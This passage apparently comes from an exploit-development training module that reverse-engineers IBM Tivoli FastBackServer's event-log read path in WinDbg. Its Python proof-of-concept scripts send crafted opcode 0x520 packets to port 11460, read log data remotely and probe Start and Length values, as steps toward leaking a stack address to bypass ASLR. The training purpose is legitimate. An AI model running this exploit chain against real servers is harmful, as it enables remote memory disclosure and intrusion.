+eip=00499c45 esp=0db5de94 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0x89:
+00499c45 83c418          add     esp,18h
+
+0:001> da 0db5dedc
+0db5dedc  "C:/ProgramData/Tivoli/TSM/FastBa"
+0db5defc  "ck/server/FAST_BACK_SERVER040.sf"
+0db5df1c  ""
+Listing 51 - Full file name is created
+From the contents of the output buffer, we find the full file name for the event log file with the maximum suffix, as expected.
+To move forward with our analysis, we'll continue inside the same basic block and find that a call to the HANDLE_MGR_Open function takes place, as shown in Figure 29.
+ 
+Figure 29: Open handle to log file
+This is another custom function, but given its name and the fact that we are hoping to read from a file, it makes sense that HANDLE_MGR_Open will likely open a handle to the log file.
+We'll also notice a subsequent check against the value 0xFFFFFFFF, which is the typical error value of an invalid handle (INVALID_HANDLE_VALUE).
+We can step to this call in WinDbg, as given in Listing 52.
+eax=00000040 ebx=060fae50 ecx=0db5dedc edx=0db5df1b esi=060fae50 edi=00669360
+eip=00499c5d esp=0db5dea0 ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0xa1:
+00499c5d e8ac89feff      call    FastBackServer!HANDLE_MGR_Open (0048260e)
+
+0:001> dds esp L3
+0db5dea0  0db5dedc
+0db5dea4  00000000
+0db5dea8  00000001
+
+0:001> da poi(esp)
+0db5dedc  "C:/ProgramData/Tivoli/TSM/FastBa"
+0db5defc  "ck/server/FAST_BACK_SERVER040.sf"
+0db5df1c  ""
+
+0:001> p
+eax=0000015e ebx=060fae50 ecx=0db5de28 edx=77e71670 esi=060fae50 edi=00669360
+eip=00499c62 esp=0db5dea0 ebp=0db5e0e4 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+FastBackServer!SFILE_S_FindFileIndexForRead+0xa6:
+00499c62 83c40c          add     esp,0Ch
+Listing 52 - Open handle to log file
+After we step over the call, we'll note that EAX contains a value different from the invalid handle. This means that we pass the comparison and move to the next basic block.
+Figure 30 shows the upper part of the next basic block.
+ 
+Figure 30: Calculating an offset
+First let's examine the call to HANDLE_MGR_fstat, which accepts the event log file name along with an output buffer.
+While we don't know what this function does, Figure 30 shows us that the "size" field of the output buffer is used in the lower highlighted part.
+Listing 53 shows the content of the output buffer before and after the call.
+eax=0000015e ebx=060fae50 ecx=0db5de28 edx=0db5deb8 esi=060fae50 edi=00669360
+eip=00499c89 esp=0db5dea4 ebp=0db5e0e4 iopl=0         nv up ei pl nz ac pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000217
+FastBackServer!SFILE_S_FindFileIndexForRead+0xcd:
+00499c89 e8f198feff      call    FastBackServer!HANDLE_MGR_fstat (0048357f)
+
+0:001> dd poi(esp+4) L8
+0db5deb8  00000000 00000000 00000000 00000000
+0db5dec8  00000000 00000000 00000000 00000000
+
+0:001> p
+eax=00000000 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360
+eip=00499c8e esp=0db5dea4 ebp=0db5e0e4 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!SFILE_S_FindFileIndexForRead+0xd2:
+00499c8e 83c408          add     esp,8
+
+0:001> dd 0db5deb8 L8
+0db5deb8  00000000 81b60000 00000001 00000000
+0db5dec8  00000000 000ac603 5ea6e6ce 5ea8ad2a
+Listing 53 - Call to HANDLE_MGR_fstat
+We'll note that the output buffer has been populated with data. The highlighted DWORD at offset 0x14 into the buffer is important since it equates to the size field, as noted in Figure 30.
+We can find the numerical value by single-stepping to the instruction where it's moved into EAX.
+eax=00000001 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360
+eip=00499ca0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0xe4:
+00499ca0 8b85e8fdffff    mov     eax,dword ptr [ebp-218h] ss:0023:0db5decc=000ac603
+Listing 54 - Content of size field
+To get an idea of what will happen next, let's recall the pseudocode for the loop, repeated below:
+index = total log size 
+while(file_suffix > 0)
+{
+  index = index - sizeof(current log file)
+  if(Start value >= index)
+  {
+    // We found the right log file
+  }
+  go to next log file
+}
+Listing 55 - C pseudocode for function of loop
+The application retrieves the size of the current log file, which must be subtracted from the total log file size. The result is then compared to the supplied Start value.
+The lower part of the basic block we analyzed is shown in Figure 31.
+ 
+Figure 31: Calculation and comparison of an offset
+There's a lot happening in this basic block, so let's split the activity into four separate parts for analysis.
+In the first highlighted part, the size of the current log file is moved into EAX. The CDQ2 instruction extends the sign bit of EAX into EDX. This means if the uppermost bit of EAX is set, EDX will be set to 0xFFFFFFFF. EDX will otherwise be set to 0.
+mov     eax, [ebp+var_22C.st_size]
+cdq
+Listing 56 - Sign extension
+Next, EDX is masked with 0xFF to extract the least significant byte as an unsigned integer. The result is added to EAX.
+and     edx, 0FFh
+add     eax, edx
+Listing 57 - Conversion to unsigned integer
+Finally, EAX is right-shifted by 8 bits through the SAR3 instruction. This is likely to convert the size to an index.
+sar     eax, 8
+Listing 58 - Right-shifting by 8 bits
+Listing 59 shows the results of the calculation on the first iteration of the loop.
+eax=00000001 ebx=060fae50 ecx=0db5de5c edx=77e71670 esi=060fae50 edi=00669360
+eip=00499ca0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0xe4:
+00499ca0 8b85e8fdffff    mov     eax,dword ptr [ebp-218h] ss:0023:0db5decc=000ac603
+
+0:001> p
+...
+eax=00000ac6 ebx=060fae50 ecx=0db5de5c edx=00000000 esi=060fae50 edi=00669360
+eip=00499cb2 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0xf6:
+00499cb2 8b95c8fdffff    mov     edx,dword ptr [ebp-238h] ss:0023:0db5deac=00000000
+0:001> 
+Listing 59 - Calculating index value of current log file
+In this case, the size value of 0xac603 resulted in an index value of 0xac6, as stored in EAX.
+With the index value of the current log file calculated, we'll move to the next highlighted portion of the basic block.
+In this section, a value is retrieved into EDX, EAX is added to it, and it is written back to the same memory location.
+mov     edx, [ebp+var_238]
+add     edx, eax
+mov     [ebp+var_238], edx
+Listing 60 - Getting the accumulator value
+This is essentially an accumulator to be used in the next iteration of the loop.
+The third portion of the basic block retrieves the maximum index of the log into ECX and subtracts the current index, as shown in Listing 61.
+mov     eax, dword ptr [ebp+arg_0]
+mov     ecx, [eax+210h]
+sub     ecx, [ebp+var_238]
+Listing 61 - Calculating the index difference
+We can observe this calculation in WinDbg.
+eax=00000ac6 ebx=060fae50 ecx=0db5de5c edx=00000ac6 esi=060fae50 edi=00669360
+eip=00499cc0 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0x104:
+00499cc0 8b4508          mov     eax,dword ptr [ebp+8] ss:0023:0db5e0ec={FastBackServer!EventLOG_sSFILE (00a99f40)}
+
+0:001> p
+eax=00a99f40 ebx=060fae50 ecx=0db5de5c edx=00000ac6 esi=060fae50 edi=00669360
+eip=00499cc3 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0x107:
+00499cc3 8b8810020000    mov     ecx,dword ptr [eax+210h] ds:0023:00a9a150=0005fe36
+
+0:001> p
+eax=00a99f40 ebx=060fae50 ecx=0005fe36 edx=00000ac6 esi=060fae50 edi=00669360
+eip=00499cc9 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_S_FindFileIndexForRead+0x10d:
+00499cc9 2b8dc8fdffff    sub     ecx,dword ptr [ebp-238h] ss:0023:0db5deac=00000ac6
+
+0:001> p
+eax=00a99f40 ebx=060fae50 ecx=0005f370 edx=00000ac6 esi=060fae50 edi=00669360
+eip=00499ccf esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!SFILE_S_FindFileIndexForRead+0x113:
+00499ccf 3b4d0c          cmp     ecx,dword ptr [ebp+0Ch] ss:0023:0db5e0f0=00000100
+Listing 62 - Calculating index to start of current log file
+Once the subtraction is done, ECX contains an index value to the start of the current log file.
+In the last highlighted section, a comparison between the current log file index and the Start value is performed. We'll only exit the loop if our supplied value is larger than the current log file index.
+While there are several calculations performed, the logic corresponds to our proposed pseudocode.
+This understanding leaves us with a challenge. To obtain the leaked stack address, we'll need to read from the newest entries in the log file with suffix 40. We cannot predict which Start value is required, since it will depend on the amount of content in the event log.
+We will solve this problem in a later section. For now, let's focus on obtaining any content from the event log and returning it to our Kali machine.
+Exercise
+1.	Follow and repeat the analysis to understand how the Start value works.
+1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/snprintf/
+2 (Aldeid, 2016), https://www.aldeid.com/wiki/X86-assembly/Instructions/cdq
+3 (Aldeid, 2019), https://www.aldeid.com/wiki/X86-assembly/Instructions/shr
+11.3.4. Read From the Log
+In the previous section, we learned how the Start value we supply determines which log file is used. Next, let's find out if the content is read from the event log at all.
+Our supplied Start value is quite small compared to the total index value. As a result, we expect one of the oldest log files to be chosen. This will have the lowest number in the suffix.
+Let's continue our analysis of the loop inside SFILE_S_FindFileIndexForRead. To determine what our Start value corresponds to, we can set a breakpoint at FastBackServer!SFILE_S_FindFileIndexForRead+0x118 where we exit the loop.
+0:001> bp FastBackServer!SFILE_S_FindFileIndexForRead+0x118
+
+0:001> g
+Breakpoint 1 hit
+eax=00a99f40 ebx=060fae50 ecx=00000000 edx=0005fe36 esi=060fae50 edi=00669360
+eip=00499cd4 esp=0db5deac ebp=0db5e0e4 iopl=0         nv up ei ng nz na pe cy
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000287
+FastBackServer!SFILE_S_FindFileIndexForRead+0x118:
+00499cd4 8b5510          mov     edx,dword ptr [ebp+10h] ss:0023:0db5e0f4=0db5e318
+Listing 63 - Exiting the loop
+The algorithm has now found the correct log file, but not the location inside of it. The Start value we supplied was only compared to the index value of the start of the log file. The last step is to find the index into the specific file.
+Since we supplied the low value of 0x100, a good assumption is that we will be reading from the first event log file. The suffix will depend on how many log files have been created. If the application has been running for a while, this suffix may be as low as 001.
+As the last step of SFILE_S_FindFileIndexForRead, we find where in the selected log file we should read from. This location is also based on the Start value. In our current example, we used the small Start value of 0x100. This value will force a selection of the oldest log file that starts at the index value of 0. This means the Start value is also the index inside the specified file.
+As another example, let's imagine that the event log file with a suffix of 020 starts at the index value 0x20000 and we provide a Start value of 0x20200. In our example, SFILE_S_FindFileIndexForRead would determine that it should read at index 0x200 inside that log file.
+After returning to SFILE_ReadBlock, we'll encounter a few checks followed by a call to ml_fopen, as displayed in Figure 32.
+ 
+Figure 32: Opening a handle to the log file
+Reviewing this call in WinDbg, we can inspect the supplied file name and verify which suffix was chosen.
+eax=00000040 ebx=060fae50 ecx=0db5e09c edx=0db5e110 esi=060fae50 edi=00669360
+eip=00499e18 esp=0db5e0f4 ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_ReadBlock+0x110:
+00499e18 e897031c00      call    FastBackServer!ml_fopen (0065a1b4)
+
+0:001> da poi(esp)
+0db5e110  "C:/ProgramData/Tivoli/TSM/FastBa"
+0db5e130  "ck/server/FAST_BACK_SERVER001.sf"
+0db5e150  ""
+Listing 64 - Log file with suffix 001 is chosen
+In this case, FastBackServer has been installed for an extended duration, so all 40 event log files have been created and the Start value of 0x100 corresponds to the file with a suffix of 001.
+If the application has been running for a long time, our Start value might not exist because it's too small.
+With the file selected and opened, we need to set the position to read from. In the following basic block, a call to fseek1 is performed.
+ 
+Figure 33: Setting read position in the log file
+To understand what fseek does, let's start by analyzing the function prototype, as given in Listing 65.
+int fseek ( 
+  FILE * stream, 
+  long int offset, 
+  int origin );
+Listing 65 - Function prototype for fseek
+The API accepts three arguments. The first (stream) is a handle to the file, the second (offset) is the offset into the file, and the last (origin) is the position the offset is counted from.
+When fseek finishes executing, the position to read from using an API, like fread, is updated. This position is set through the second and third arguments.
+To obtain the current values in WinDbg, let's step to the call into fseek where we can display the arguments.
+eax=00010000 ebx=060fae50 ecx=008c8408 edx=77e71670 esi=060fae50 edi=00669360
+eip=00499e47 esp=0db5e0f0 ebp=0db5e31c iopl=0         nv up ei pl nz na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
+FastBackServer!SFILE_ReadBlock+0x13f:
+00499e47 e8d7ff1c00      call    FastBackServer!fseek (00669e23)
+
+0:001> dds esp L3
+0db5e0f0  008c8408 FastBackServer!_iob+0x80
+0db5e0f4  00010000
+0db5e0f8  00000000
+Listing 66 - Arguments for fseek
+The output above shows that the Start value we supplied is converted to 0x10000. This equates to a left-shift of 8 bits, after which the value is supplied as the offset argument for fseek.
+At this point, we've located the code that selects the desired event log file and calculates the offset into it. We then found a call to ml_fopen that gets a handle to the log file. Finally, we found a call to fseek that sets the position inside the file.
+Our last step is to read from the file.
+If we continue our analysis of the code in IDA Pro, we find that this is done with fread in a subsequent basic block, as shown in Figure 19.
+ 
+Figure 19: Reading from the log file
+fread uses the position set by fseek to read data. The amount of data read is not yet clear to us.
+When we called into SFILE_ReadBlock, values parsed from the format string were used as arguments. The format string is repeated in Listing 67.
+buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x200)
+Listing 67 - Format string in our PoC
+The first value we dealt with inside SFILE_ReadBlock was the Start value. The second value, Length, was provided to SFILE_ReadBlock as the third argument.
+The Start value determines which log file and which offset into it we will read from. The Length value appears in the basic block shown in Figure 19 because it's stored at EBP+arg_8, which is the third argument for SFILE_ReadBlock.
+After some modifications, the Length value is supplied as the third argument to fread, which represents the number of elements to read.
+To examine the values supplied to fread, we'll let WinDbg catch up, as shown in Listing 68.
+eax=008c8408 ebx=060fae50 ecx=00000020 edx=77e71670 esi=060fae50 edi=00669360
+eip=00499e6b esp=0db5e0f8 ebp=0db5e31c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!SFILE_ReadBlock+0x163:
+00499e6b 8b4d10          mov     ecx,dword ptr [ebp+10h] ss:0023:0db5e32c=00000200
+
+0:001> p
+eax=008c8408 ebx=060fae50 ecx=00000200 edx=77e71670 esi=060fae50 edi=00669360
+eip=00499e6e esp=0db5e0f8 ebp=0db5e31c iopl=0         nv up ei pl zr na pe nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
+FastBackServer!SFILE_ReadBlock+0x166:
+00499e6e c1e108          shl     ecx,8
+
+0:001> p
+...
+eax=008c8408 ebx=060fae50 ecx=00020000 edx=018943a8 esi=060fae50 edi=00669360
+eip=00499e84 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!SFILE_ReadBlock+0x17c:
+00499e84 e8b9d91c00      call    FastBackServer!fread (00667842)
+
+0:001> dds esp L4
+0db5e0ec  018943a8
+0db5e0f0  00000001
+0db5e0f4  00020000
+0db5e0f8  008c8408 FastBackServer!_iob+0x80
+Listing 68 - Arguments for fread
+First, we'll notice that the Length value is left-shifted by 8 bits, so our input value of 0x200 becomes 0x20000. Just before calling fread, we find that this value is supplied to fread as the number of elements to read.
+We'll inspect the output buffer for fread after the call to it has completed, as shown in Listing 69.
+0:001> p
+eax=00020000 ebx=060fae50 ecx=00000020 edx=00020000 esi=060fae50 edi=00669360
+eip=00499e89 esp=0db5e0ec ebp=0db5e31c iopl=0         nv up ei pl nz ac po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
+FastBackServer!SFILE_ReadBlock+0x181:
+00499e89 83c410          add     esp,10h
+
+0:001> da 018943a8
+018943a8  "  .[Apr 22 00:10:04:998](15b4)->"
+018943c8  "I4.GENERAL  .:.|tOA             "
+018943e8  "              |     0|200000|199"
+01894408  "000|199000|      0|   17496|    "
+01894428  "0.00|    0.17|PRIORITY|         "
+01894448  "                                "
+01894468  "                                "
+01894488  "                                "
+018944a8  "  .[Apr 22 00:10:05:013](15b4)->"
+018944c8  "I4.GENERAL  .:.|----------------"
+018944e8  "--------------|------|------|---"
+01894508  "---|------|-------|--------|----"
+Listing 69 - Content from the log file has been read
+We can observe that content similar to that which we found in the event log earlier has been read into the output buffer.
+To verify that the content of the buffer does indeed come from the log file, we can use the Select-String cmdlet2 to locate the same content inside the log file with the lowest suffix, in our case FAST_BACK_SERVER001.sf.
+PS C:\Tools> Select-String C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf -Pattern '[Apr 22 00:10:04:998]' -SimpleMatch
+
+C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:255:[Apr 22 00:10:04:998](15b4)->I4.GENERAL    :       |
+                         |      |      |      |Abort |       |        |MB      |MB      |Type    |
+
+C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:256:[Apr 22 00:10:04:998](15b4)->I4.GENERAL    :       
+|------------------------------|------|------|------|------|-------|--------|--------|--------|--------|
+
+C:\ProgramData\Tivoli\TSM\FastBack\server\FAST_BACK_SERVER001.sf:257:[Apr 22 00:10:04:998](15b4)->I4.GENERAL    :       |tOA
+                         |     0|200000|199000|199000|      0|   17496|    0.00|    0.17|PRIORITY|
+Listing 70 - Search for string in event log file
+The highlighted portion of Listing 70 confirms that the content read into the output buffer by fread does indeed come from the correct event log file. Excellent!
+In this section, we managed to read content from the event log based on the Start and Length values we supplied. The last step is to find out how to return the content that was read to us.
+Exercise
+1.	Follow and repeat the analysis to understand how the Length value works and read content from the event log.
+1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/fseek/
+2 (Microsoft, 2020), https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7
+11.3.5. Return the Log Content
+Now that we've found a code path that allows us to read from the event log, we need to learn how to return that data to our Kali machine. Given that an opcode triggers a read from the event log, it stands to reason that the result should be passed somewhere, otherwise it is not of much use.
+In the previous module, we found that FXCLI_OraBR_Exec_Command contains functionality to return data through TCP packets. We need to ensure that our event log data follows the same path.
+After reading the contents from the event log file, a short epilogue is executed, after which we can exit SFILE_ReadBlock and return back into FXCLI_OraBR_Exec_Command.
+ 
+Figure 34: Return value check
+After returning from SFILE_ReadBlock, we find a null value check on the function return value.
+Let's quickly check this value in WinDbg by continuing execution until the function returns and stepping out of it:
+0:001> pt
+eax=00020000 ebx=060fae50 ecx=0db5e0d4 edx=77e71670 esi=060fae50 edi=00669360
+eip=00499f19 esp=0db5e320 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!SFILE_ReadBlock+0x211:
+00499f19 c3              ret
+
+0:001> p
+eax=00020000 ebx=060fae50 ecx=0db5e0d4 edx=77e71670 esi=060fae50 edi=00669360
+eip=00570f08 esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x4a52:
+00570f08 83c410          add     esp,10h
+Listing 71 - Return value of SFILE_ReadBlock is number of bytes read
+As highlighted in Listing 71, the return value of SFILE_ReadBlock is the number of bytes read from the log file.
+This means we will trigger the JNZ and, after another jump, reach the basic block shown in Figure 35.
+ 
+Figure 35: Code path that leads to data return
+As we'll recall from a previous module, this is the starting branch that enables our data to be returned to us. We seem to be on the right track.
+When we trace execution, we will find ourselves following the same path through the checks until we reach FXCLI_IF_Buffer_Send, as shown in Figure 36.
+ 
+Figure 36: Arguments for FXCLI_IF_Buffer_Send
+To check the arguments, we can single step in WinDbg to the call into FXCLI_IF_Buffer_Send and dump them:
+eax=018943a8 ebx=060fae50 ecx=04f91020 edx=00020000 esi=060fae50 edi=00669360
+eip=00575d2d esp=0db5e324 ebp=0dbbfe98 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
+FastBackServer!FXCLI_OraBR_Exec_Command+0x9877:
+00575d2d e8817d0000      call    FastBackServer!FXCLI_IF_Buffer_Send (0057dab3)
+
+0:001> dds esp L4
+0db5e324  018943a8
+0db5e328  00020000
+0db5e32c  04f91020
+0db5e330  00000001
+
+0:001> da 018943a8
+018943a8  "  .[Apr 22 00:10:04:998](15b4)->"
+018943c8  "I4.GENERAL  .:.|tOA             "
+018943e8  "              |     0|200000|199"
+01894408  "000|199000|      0|   17496|    "
+01894428  "0.00|    0.17|PRIORITY|         "
+...
+Listing 72 - Arguments for FXCLI_IF_Buffer_Send
+The first argument does indeed contain the event log entry content that was read. The second argument, highlighted in Listing 72, is also the size of the data that was read.
+Next, let's update our Python code to receive a response from the socket. This small change is highlighted in Listing 73.
+...
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((server, port))
+
+s.send(buf)
+response = s.recv(1024)
+print(response)
+
+s.close()
+...
+Listing 73 - Add a recv call to our code
+To run our new proof of concept, we can remove all breakpoints in WinDbg and let execution continue.
+kali@kali:~$ python3 poc.py 192.168.120.10
+b'\x00\x02\x00\x00  \n[Apr 22 00:10:04:998](15b4)->I4.GENERAL  \t:\t|tOA                           |     0|200000|199000|199000|      0|   17496|    0.00|    0.17|PRIORITY|                                                                                                           \n[Apr 22 00:10:05:013](15b4)->I4.GENERAL  \t:\t|------------------------------|------|------|------|------|-------|--------|--------|--------|--------|                                                                                                           \n[Apr 22 00:10:05:013](15b4)->I4.GENERAL  \t:\t|tFXC                          |     0|200000|199000|199000|      0|   17496|    0.00|    0.17|PRIORITY|                                                                                                           \n[Apr 22 00:10:05:029](15b4)->I4.GENERAL  \t:\t|------------------------------|------|------|------|------|-------|--------|--------|--------|--------|                                                                                                     '
+[+] Packet sent
+Listing 74 - Obtaining event log data
+We have received the event log data. This is a great success!
+Note that the request may fail to return data and multiple executions of the poc may be required.
+This section concludes our initial work understanding how to remotely trigger a read from the event log. To make use of this in our exploit, we have to address several challenges, including determining the Start and Length values needed to read specific event log entries.
+We will also need to learn how to parse the data that is returned to us so it can be used programmatically in our exploit.
+Exercises
+1.	Repeat the analysis on how to read event log data remotely.
+2.	Update your proof of concept to obtain event log data remotely.
+11.4. Bypassing ASLR with Format Strings
+We have now discovered a format string vulnerability that allows us to disclose a stack address and have it written to the custom event log. We have also learned how to read from the event log.
+In the next three sections, we will combine these findings to first return the stack address, and then obtain the memory address of a DLL, which will allow us to bypass ASLR.
+11.4.1. Parsing the Event Log
+Before we can leak the stack address from the event log, we need to learn how to read from a specific portion of it. In this section, we will dive into the way the Start and Length values determine what output is returned.
+From our reverse engineering, we know that the Length value determines the amount of data read. We also know that the value we supply is left-shifted by 8 bits, which equates to multiplying it by 0x100.
+What we don't know yet is the maximum allowed value. To figure this out, let's examine the response we got from the returned event log content. Specifically, we'll review the first line, as given in Listing 75.
+kali@kali:~$ python3 poc.py 192.168.120.10
+b'\x00\x02\x00\x00  \n[Apr 22 00:10:04:998](15b4)->I4.GENERAL  \t:\t|tOA 
+...
+Listing 75 - The initial response from reading the event log
+As highlighted in the output, the first four bytes are a byte array containing the Length value, left-shifted by 8 bits. This means that when the content is returned to us, we'll also get its size as the first four bytes.
+To take advantage of this, we will only receive the first four bytes of the reply and convert that to an integer. We can then perform multiple requests with an increasing Length value and check the corresponding reply for errors.
+The code for this can be adapted from the previous proof of concept by moving the packet creation, transmission, and reception into a for loop.
+We also want to limit the reply from the server to just four bytes. These four bytes are then converted to an integer and printed along with the original Length value.
+if len(sys.argv) != 2:
+		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
+		sys.exit(1)
+	
+	server = sys.argv[1]
+	port = 11460
+	
+	for l in range(0x100):
+		# psAgentCommand
+		buf = pack(">i", 0x400)
+		buf += bytearray([0x41]*0xC)
+		buf += pack("<i", 0x520)  # opcode
+		buf += pack("<i", 0x0)    # 1st memcpy: offset
+		buf += pack("<i", 0x100)  # 1st memcpy: size field
+		buf += pack("<i", 0x100)  # 2nd memcpy: offset
+		buf += pack("<i", 0x100)  # 2nd memcpy: size field
+		buf += pack("<i", 0x200)  # 3rd memcpy: offset
+		buf += pack("<i", 0x100)  # 3rd memcpy: size field
+		buf += bytearray([0x41]*0x8)
+
+		# psCommandBuffer
+		buf += b"FileType: %d ,Start: %d, Length: %d" % (1, 0x100, 0x100 * (l+1))  
+		buf += b"B" * 0x100 
+		buf += b"C" * 0x100 
+
+		# Padding
+		buf += bytearray([0x41]*(0x404-len(buf)))
+
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		s.connect((server, port))
+		
+		s.send(buf)
+		response = s.recv(4)
+		size = int(response.hex(),16)
+
+		print("Length value is: " + str(hex(0x100 * (l+1))) + " The size returned is: " + str(hex(size)))
+
+		s.close()
+
+	sys.exit(0)
+Listing 76 - Loop to test values of Length
+Let's execute the proof of concept and check the Length value against the corresponding return size, as shown in Listing 77.
+kali@kali:~$ python3 poc.py 192.168.120.10
+Length value is: 0x100 The size returned is: 0x10000
+Length value is: 0x200 The size returned is: 0x20000
+Length value is: 0x300 The size returned is: 0x30000
+Length value is: 0x400 The size returned is: 0x40000
+Length value is: 0x500 The size returned is: 0x50000
+Length value is: 0x600 The size returned is: 0x60000
+Length value is: 0x700 The size returned is: 0x70000
+Length value is: 0x800 The size returned is: 0x80000
+Length value is: 0x900 The size returned is: 0x90000
+Length value is: 0xa00 The size returned is: 0xa0000
+Length value is: 0xb00 The size returned is: 0xb0000
+Length value is: 0xc00 The size returned is: 0xc0000
+Length value is: 0xd00 The size returned is: 0xd0000
+Length value is: 0xe00 The size returned is: 0xe0000
+Length value is: 0xf00 The size returned is: 0xf0000
+Length value is: 0x1000 The size returned is: 0x100000
+Length value is: 0x1100 The size returned is: 0x1
+Length value is: 0x1200 The size returned is: 0x1
+Length value is: 0x1300 The size returned is: 0x1
+Length value is: 0x1400 The size returned is: 0x1
+...
+Listing 77 - Result of Length enumeration
+The output reveals that a Length value larger than 0x1000 results in an error. With the value 0x1000, we can read as much of the log entry as possible at once.
+We should note that after running the testing code and obtaining the error, we have to restart the FastBackServer service to obtain usable results again.
+Now that we know the optimal value for Length, let's turn to the Start value.
+We already have most of the required knowledge from our work earlier. The Start value chooses both which log file to read from and the offset into the chosen log file.
+While we were able to determine and hardcode the best value for Length, the Start value must be found dynamically when we execute the exploit.
+Let's keep in mind that new log entries are added at the end of the log file with the suffix 040. When we leak the stack pointer and subsequently read from the event log, we expect the stack pointer leak to be among the newest entries.
+Knowing all of this, we still can't find a specific Start value. Instead, we need to choose one in such a way that a read operation will reach the end of the newest log file.
+The size of the content read from the event log is returned to us in the first four bytes of the TCP packet. This means we can perform a loop by beginning with a Start value of 0, and then use the size to determine if we reached the end of the log.
+If the returned data size is 0x100000, we will need to increase the Start value and try again. By increasing the Start value, we will eventually reach the end of the log file. At that point, less data than 0x100000 will be read, and the returned size is expected to be less than 0x100000.
+We can test this by once again adapting our initial event log read code, as given in Listing 78.
+server = sys.argv[1]
+port = 11460
+
+startValue = 0
+
+while True:
+
+  # psAgentCommand
+	buf = pack(">i", 0x400)
+	buf += bytearray([0x41]*0xC)
+	buf += pack("<i", 0x520)  # opcode
+	buf += pack("<i", 0x0)    # 1st memcpy: offset
+	buf += pack("<i", 0x100)  # 1st memcpy: size field
+	buf += pack("<i", 0x100)  # 2nd memcpy: offset
+	buf += pack("<i", 0x100)  # 2nd memcpy: size field
+	buf += pack("<i", 0x200)  # 3rd memcpy: offset
+	buf += pack("<i", 0x100)  # 3rd memcpy: size field
+	buf += bytearray([0x41]*0x8)
+
+	# psCommandBuffer
+	buf += b"FileType: %d ,Start: %d, Length: %d" % (1, startValue, 0x1000)  
+	buf += b"B" * 0x100 
+	buf += b"C" * 0x100 
+
+	# Padding
+	buf += bytearray([0x41]*(0x404-len(buf)))
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect((server, port))
+		
+	s.send(buf)
+	response = s.recv(4)
+	size = int(response.hex(),16)
+
+	print("Start value of " + str(hex(startValue)) + " Yields a data size of: " + str(hex(size)))
+	startValue += 0x1000
+	s.close()
+		
+sys.exit(0)
+Listing 78 - Code to enumerate Start values
+We can perform a read from the event log with the given Start value and print out the returned data length. The increase in the size of Start by 0x1000 is arbitrary, but we will find it to be appropriate.
